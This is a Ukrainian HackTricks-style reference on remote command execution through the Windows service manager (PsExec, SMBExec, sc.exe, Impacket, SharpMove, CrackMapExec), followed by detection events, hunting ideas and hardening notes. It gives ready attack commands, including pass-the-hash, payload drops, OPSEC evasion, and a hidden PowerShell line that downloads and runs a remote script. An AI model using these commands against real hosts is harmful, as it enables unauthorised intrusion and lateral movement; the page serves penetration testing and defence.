# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Як вони працюють

Ці техніки зловживають Windows Service Control Manager (SCM) віддалено через SMB/RPC для виконання команд на цільовому хості. Типовий процес:

1. Автентифікуйтеся на цільовому хості та отримайте доступ до спільного ресурсу ADMIN$ через SMB (TCP/445).
2. Скопіюйте виконуваний файл або вкажіть командний рядок LOLBAS, який запустить служба.
3. Віддалено створіть службу через SCM (MS-SCMR через \PIPE\svcctl), вказавши цю команду або бінарний файл.
4. Запустіть службу для виконання payload і, за потреби, перехоплюйте stdin/stdout через іменований канал.
5. Зупиніть службу та виконайте очищення (видаліть службу та всі скопійовані бінарні файли).

Вимоги та передумови:
- Локальний адміністратор на цільовому хості (SeCreateServicePrivilege) або явні права на створення служб на цільовому хості.
- Доступний SMB (445) і спільний ресурс ADMIN$; Remote Service Management має бути дозволено через брандмауер хоста.
- UAC Remote Restrictions: для локальних облікових записів фільтрація токенів може блокувати права адміністратора в мережі, якщо не використовувати вбудований обліковий запис Administrator або LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: використання імені хоста/FQDN дає змогу застосувати Kerberos; підключення за IP часто перемикається на NTLM (і може блокуватися в захищених середовищах).

### Ручний ScExec/WinExec через sc.exe

Нижче показано мінімальний спосіб створення служби. Як образ служби можна використати скопійований EXE або LOLBAS, наприклад cmd.exe чи powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Нотатки:
- Очікуйте помилку тайм-ауту під час запуску EXE, який не є службою; виконання все одно відбувається.
- Щоб діяти більш OPSEC-friendly, віддавайте перевагу безфайловим командам (cmd /c, powershell -enc) або видаляйте залишені артефакти.

Детальніші інструкції: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Інструменти та приклади

### Sysinternals PsExec.exe

- Класичний інструмент адміністратора, який використовує SMB для копіювання PSEXESVC.exe в ADMIN$, встановлює тимчасову службу (за замовчуванням із назвою PSEXESVC) і передає дані введення-виведення через іменовані канали.
- Приклади використання:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Можна запускати безпосередньо з Sysinternals Live через WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Залишає події встановлення/видалення служби (назва служби часто PSEXESVC, якщо не використовується -r) і під час виконання створює C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (подібний до PsExec)

- Використовує вбудовану службу на кшталт RemCom. Через ADMIN$ скидає тимчасовий бінарний файл служби (зазвичай із випадковою назвою), створює службу (типово RemComSvc) і проксіює введення-виведення через іменований канал.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Артефакти
- Тимчасовий EXE у C:\Windows\ (8 випадкових символів). За замовчуванням ім’я служби — RemComSvc, якщо його не перевизначено.

### Impacket smbexec.py (SMBExec)

- Створює тимчасову службу, яка запускає cmd.exe і використовує іменований канал для вводу/виводу. Зазвичай дозволяє не скидати повний EXE payload; виконання команд є напівінтерактивним.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) реалізує кілька методів lateral movement, зокрема виконання на основі служб.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) містить функції модифікації/створення служб для віддаленого виконання команди.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Також можна використовувати CrackMapExec для виконання через різні бекенди (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, виявлення та артефакти

Типові артефакти на хості/в мережі під час використання технік на кшталт PsExec:
- Події Security 4624 (Logon Type 3) і 4672 (Special Privileges) на цільовому хості для використаного облікового запису адміністратора.
- Події Security 5140/5145 File Share і File Share Detailed, що свідчать про доступ до ADMIN$ і створення/запис файлів бінарних файлів служб (наприклад, PSEXESVC.exe або випадкового 8-символьного .exe).
- **System** 7045 від Service Control Manager про встановлення служби на цільовому хості: наприклад, PSEXESVC, RemComSvc або власна назва (`-r` / `-service-name`). Це підтверджує встановлення служби, але не те, що її образ запускався. За можливості зіставте час і шлях до образу з подіями процесів або відповідним записом prefetch для образу служби.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) для services.exe або образу служби, 3 (Network Connect), 11 (File Create) у C:\Windows\, 17/18 (Pipe Created/Connected) для каналів, наприклад \\.\pipe\psexesvc, \\.\pipe\remcom_* або їхніх рандомізованих варіантів.
- Артефакт у реєстрі для EULA Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 на хості оператора (якщо це не було вимкнено).

Ідеї для пошуку
- Створюйте сповіщення про встановлення служб, у яких ImagePath містить cmd.exe /c, powershell.exe або шляхи до TEMP.
- Шукайте створення процесів, у яких ParentImage — C:\Windows\PSEXESVC.exe, або дочірні процеси services.exe, що запускають оболонки від імені LOCAL SYSTEM.
- Позначайте іменовані канали, назви яких закінчуються на -stdin/-stdout/-stderr, або відомі назви каналів клонів PsExec.

## Усунення поширених проблем
- Access is denied (5) під час створення служб: обліковий запис насправді не є локальним адміністратором, діють обмеження UAC для віддалених підключень локальних облікових записів або EDR блокує втручання в шлях до бінарного файлу служби.
- The network path was not found (53) або не вдалося підключитися до ADMIN$: брандмауер блокує SMB/RPC або адміністративні спільні ресурси вимкнено.
- Kerberos не працює, але NTLM заблоковано: підключайтеся за іменем хоста/FQDN (не за IP), перевірте правильність SPN або передайте -k/-no-pass із квитками під час використання Impacket.
- Час очікування запуску служби вичерпано, але payload виконався: це очікувано, якщо бінарний файл не є справжньою службою; записуйте вивід у файл або використовуйте smbexec для інтерактивного вводу/виводу.

## Зауваження щодо посилення захисту
- Windows 11 24H2 і Windows Server 2025 вимагають підписування SMB за замовчуванням для вихідних підключень (а Windows 11 — і для вхідних). Це не порушує легітимне використання PsExec із дійсними обліковими даними, але запобігає атакам ретрансляції SMB без підпису й може вплинути на пристрої, що не підтримують підписування.<sup>[[2]](#references)</sup>
- Нова функція блокування NTLM у клієнті SMB (Windows 11 24H2/Server 2025) може перешкоджати переходу на NTLM під час підключення за IP-адресою або до серверів без Kerberos. У середовищах із посиленим захистом це порушить роботу PsExec/SMBExec на основі NTLM; використовуйте Kerberos (ім’я хоста/FQDN) або налаштуйте винятки, якщо це потрібно з легітимною метою.<sup>[[2]](#references)</sup>
- Принцип найменших привілеїв: обмежуйте кількість учасників локальної групи адміністраторів, надавайте права адміністратора Just-in-Time/Just-Enough, застосовуйте LAPS і відстежуйте/налаштовуйте сповіщення про встановлення служб 7045.

## Див. також

- Віддалене виконання команд на основі WMI (часто без файлів):

{{#ref}}
./wmiexec.md
{{#endref}}

- Віддалене виконання команд на основі WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec — Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Посилення безпеки SMB у Windows Server 2025 і Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Використання облікових даних для захоплення контролю над комп’ютерами Windows — частина 2 (PSExec і служби)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft — Усунення непередбачених перезавантажень за допомогою журналів системних подій](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
